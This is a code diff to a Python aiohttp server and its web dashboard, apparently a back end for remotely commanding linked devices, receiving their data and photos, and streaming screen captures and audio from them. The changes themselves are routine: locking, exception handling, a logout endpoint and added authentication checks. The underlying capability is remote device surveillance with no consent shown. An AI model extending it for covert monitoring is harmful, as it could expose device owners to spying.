@@ -20,6 +20,8 @@ from pathlib import Path
 from urllib.parse import urlparse, parse_qs
 from collections import OrderedDict
 
+import threading
+
 import aiohttp
 from aiohttp import web
 
@@ -76,6 +78,7 @@ _data_forward_dedup = {}  # data forward dedup: device_id:type -> timestamp
 _data_body_dedup = {}  # dedup for /api/data body endpoint: device_id:command -> {last_time, last_hash}
 
 firebase_connected = False  # Tracks Firebase connectivity status
+_file_lock = threading.Lock()
 
 # حد أدنى بين رسائل البوت لنفس المحادثة (بالثواني)
 RATE_LIMIT_SECONDS = 1
@@ -349,10 +352,11 @@ def load_json(path, default=None):
 
 
 def save_json(path, data):
-    try:
-        path.write_text(json.dumps(data, ensure_ascii=False, indent=2))
-    except Exception as exc:
-        log.error("Failed to save %s: %s", path, exc)
+    with _file_lock:
+        try:
+            path.write_text(json.dumps(data, ensure_ascii=False, indent=2))
+        except Exception as exc:
+            log.error("Failed to save %s: %s", path, exc)
 
 
 def append_event(event, details=None, level="info"):
@@ -545,7 +549,7 @@ def validate_session(token):
                 expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
                 if now > expires:
                     return None
-            except:
+            except Exception:
                 return None
             return s
     return None
@@ -691,7 +695,7 @@ async def _firebase_push_cmd_async(cmd):
                 try:
                     await firebase_set(f"commands/{device_id}/{cmd_id}", None)
                     log.info("Firebase: Command %s auto-deleted after timeout", cmd_id)
-                except:
+                except Exception:
                     pass
             asyncio.ensure_future(_delayed_delete())
         else:
@@ -1585,7 +1589,7 @@ async def handle_callback_query(callback):
             await answer_callback_query(cb_id)
             return
         if data == "srv_setpass":
-            await edit_message_text(chat_id, message_id, "🔑 <b>تغيير كلمة المرور</b>\n\nأرسل /password <كلمة_المرور_الجديدة>", reply_markup=build_server_menu())
+            await edit_message_text(chat_id, message_id, "🔑 <b>تغيير كلمة المرور</b>\n\nأرسل /set_password <كلمة_المرور_الجديدة>", reply_markup=build_server_menu())
             await answer_callback_query(cb_id)
             return
         if data == "srv_addadmin":
@@ -1908,7 +1912,7 @@ async def api_command_result(request):
                             display_text = f"تم بنجاح - {count} عنصر\n\n<code>{json.dumps(rj['data'], ensure_ascii=False, indent=2)[:3000]}</code>"
                         else:
                             display_text = f"تم بنجاح - {count} عنصر (أول 10)\n\n<code>{json.dumps(rj['data'][:10], ensure_ascii=False, indent=2)[:2000]}</code>\n\n...و {count-10} أخرى"
-                except:
+                except Exception:
                     pass
 
                 cmd_desc = command or cmd_id
@@ -2024,7 +2028,7 @@ async def api_device_data(request):
                 try:
                     await send_photo(ADMIN_CHAT_ID, base64.b64decode(img_data),
                                      caption=f"📷 {data_type} from {dev_name}")
-                except:
+                except Exception:
                     await send_admin(f"📷 {data_type} from {dev_name}\n(Image data received)", disable_notification=True)
         else:
             # Generic data forward - with dedup
@@ -2515,6 +2519,15 @@ async def api_web_login(request):
         return web.json_response({"ok": False, "error": str(exc)}, status=500)
 
 
+async def api_web_logout(request):
+    token = request.headers.get("Authorization", "").replace("Bearer ", "")
+    if token:
+        sessions = load_json(SESSIONS_FILE, [])
+        sessions = [s for s in sessions if s.get("token") != token]
+        save_json(SESSIONS_FILE, sessions)
+    return web.json_response({"ok": True})
+
+
 def require_auth(func):
     """Decorator to require valid session token."""
     async def wrapper(request, *args, **kwargs):
@@ -2982,6 +2995,7 @@ else{document.getElementById('loginError').style.display='block';}
 }
 
 function doLogout(){
+try{api('web/logout',{method:'POST'});}catch(e){}
 TOKEN='';localStorage.removeItem('az_token');
 document.getElementById('app').style.display='none';
 document.getElementById('loginPage').style.display='flex';
@@ -2997,11 +3011,11 @@ POLL_INTERVAL=setInterval(loadAll,5000);
 
 function toggleSidebar(){document.getElementById('sidebar').classList.toggle('open');}
 
-function showPage(name){
+function showPage(name,event){
 document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
 document.getElementById('page-'+name).classList.add('active');
 document.querySelectorAll('.sidebar a').forEach(a=>a.classList.remove('active'));
-event.target.classList.add('active');
+if(event&&event.target)event.target.classList.add('active');
 document.getElementById('sidebar').classList.remove('open');
 }
 
@@ -3022,6 +3036,8 @@ async function loadAll(){
 try{const r=await api('web/stats');if(r.ok)renderStats(r.stats);}catch(e){}
 try{const r=await api('web/devices');if(r.ok){DEVICES=r.devices||[];populateDeviceSelects();renderDevices();}}catch(e){}
 try{const r=await api('web/commands');if(r.ok)renderCommandLog(r.commands);}catch(e){}
+loadEvents();
+loadSettings();
 }
 
 function renderStats(s){
@@ -3209,6 +3225,7 @@ let _audioAnimFrame=null;
 let _streamWaitingTimer=null;
 let _firstFrameReceived=false;
 let _lastFrameData='';
+let _streamQuality=3;
 
 function populateStreamDeviceSelect(){
 const html=DEVICES.map(d=>'<option value="'+d.id+'">'+(d.name||d.id)+' ('+(d.active?'&#x1F7E2;':'&#x1F534;')+')</option>').join('');
@@ -3234,6 +3251,7 @@ document.getElementById('qualityCard').style.display=type==='audio'?'none':'bloc
 }
 
 function setQuality(q,btn){
+_streamQuality={'low':8,'medium':3,'high':1}[q]||3;
 document.querySelectorAll('.stream-quality button').forEach(function(b){b.classList.remove('active');});
 btn.classList.add('active');
 notify('تم تغيير الجودة');
@@ -3269,7 +3287,7 @@ var dev=DEVICES.find(function(d){return d.id===devId;});
 document.getElementById('stDevice').textContent=(dev&&dev.name)||devId;
 _setViewerState('waiting');
 notify('جاري بدء البث: '+typeLabel);
-var interval=_streamType==='audio'?5:3;
+var interval=_streamType==='audio'?5:_streamQuality;
 var r=await api('stream/jpeg_start',{method:'POST',body:JSON.stringify({device_id:devId,type:_streamType,interval:interval})});
 if(!r.ok){notify('فشل بدء البث: '+(r.error||''),'var(--accent)');_setViewerState('error');_streamActive=false;document.getElementById('btnStartStream').style.display='';document.getElementById('btnStopStream').style.display='none';return;}
 notify('تم بدء البث - بانتظار الإطار الأول...');
@@ -3544,7 +3562,7 @@ async def firebase_result_listener():
                                             display_text = f"تم بنجاح - {count} عنصر (أول 10)\n\n<code>{items_str}</code>\n\n...و {count-10} أخرى"
                                     elif isinstance(data, dict):
                                         display_text = json.dumps(data, ensure_ascii=False, indent=2)[:3000]
-                        except:
+                        except Exception:
                             pass
 
                         cmd_desc = command or cmd_id
@@ -3663,7 +3681,7 @@ async def firebase_result_listener():
                                 if now - ts_val > 90:
                                     await firebase_set(f"commands/{did}/{cid}", None)
                                     log.info("Cleaned stale Firebase command %s/%s (age=%ds)", did, cid, int(now-ts_val))
-                            except:
+                            except Exception:
                                 await firebase_set(f"commands/{did}/{cid}", None)
                         else:
                             # No timestamp - delete if we've already processed it
@@ -3688,7 +3706,7 @@ async def session_cleanup_loop():
                     expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
                     if now <= expires:
                         active.append(s)
-                except:
+                except Exception:
                     continue
             save_json(SESSIONS_FILE, active)
             
@@ -3700,7 +3718,7 @@ async def session_cleanup_loop():
             if len(unused) > 100:
                 unused = unused[-100:]
             save_json(LINK_CODES_FILE, used + unused)
-        except:
+        except Exception:
             pass
         await asyncio.sleep(3600)
 
@@ -3830,6 +3848,7 @@ def create_app():
     app.router.add_get("/api/web/settings", api_web_settings_get)
     app.router.add_put("/api/web/settings", api_web_settings_set)
     app.router.add_delete("/api/web/unlink/{device_id}", api_web_unlink)
+    app.router.add_post("/api/web/logout", api_web_logout)
     
     # ========== STREAMING WebSocket & REST API ==========
 
@@ -3899,7 +3918,7 @@ def create_app():
                                     if target == device_id or target == stream_id:
                                         try:
                                             await vinfo["ws"].send_str(msg.data)
-                                        except:
+                                        except Exception:
                                             pass
 
                         elif msg_type == "error":
@@ -3947,7 +3966,7 @@ def create_app():
             if stream_id in key:
                 try:
                     await ws.send_str(json.dumps({"type": "cached_frame", **entry}))
-                except:
+                except Exception:
                     break
 
         try:
@@ -3964,9 +3983,9 @@ def create_app():
                                     if did == stream_id or dinfo.get("stream_id") == stream_id:
                                         try:
                                             await dinfo["ws"].send_str(msg.data)
-                                        except:
+                                        except Exception:
                                             pass
-                    except:
+                    except Exception:
                         pass
         finally:
             _stream_connections.pop(viewer_id, None)
@@ -3974,6 +3993,7 @@ def create_app():
 
         return ws
 
+    @require_auth
     async def api_stream_frame(request):
         """GET /api/stream/frame/{device_id}?type=video|audio - Get latest stream frame for a device"""
         device_id = request.match_info.get("device_id", "")
@@ -3991,6 +4011,7 @@ def create_app():
 
         return web.json_response({"ok": True, **entry})
 
+    @require_auth
     async def api_stream_status(request):
         """GET /api/stream/status - Get all active stream connections"""
         active = {}
@@ -4042,6 +4063,7 @@ def create_app():
         finally:
             log.info("JPEG stream loop ended: device=%s", device_id)
 
+    @require_auth
     async def api_jpeg_stream_start(request):
         """POST /api/stream/jpeg_start - Start JPEG screenshot streaming for a device."""
         global api_hits
@@ -4094,6 +4116,7 @@ def create_app():
             log.error("jpeg_stream_start error: %s", exc)
             return web.json_response({"ok": False, "error": str(exc)}, status=500)
 
+    @require_auth
     async def api_jpeg_stream_stop(request):
         """POST /api/stream/jpeg_stop - Stop JPEG screenshot streaming for a device."""
         global api_hits
@@ -4106,6 +4129,7 @@ def create_app():
                 return web.json_response({"ok": False, "error": "device_id required"}, status=400)
 
             info = _jpeg_stream_info.get(device_id)
+            stream_type_saved = info.get("type", "") if info else ""
             if info:
                 info["active"] = False
                 task = _jpeg_stream_tasks_module.get(device_id)
@@ -4115,7 +4139,7 @@ def create_app():
                 del _jpeg_stream_info[device_id]
 
             # Also queue stop commands if it was an audio stream
-            if info and info.get("type") == "audio":
+            if stream_type_saved == "audio":
                 queue_command(device_id, "stop_audio_stream")
 
             update_device(device_id, {"streaming": False})
@@ -4230,7 +4254,7 @@ async def on_startup(app):
             f"📋 Commands: <code>{len(COMMAND_REGISTRY)}</code>\n"
             f"📱 Web: <code>{SERVER_DOMAIN}/dashboard</code>"
         )
-    except:
+    except Exception:
         pass
 
 
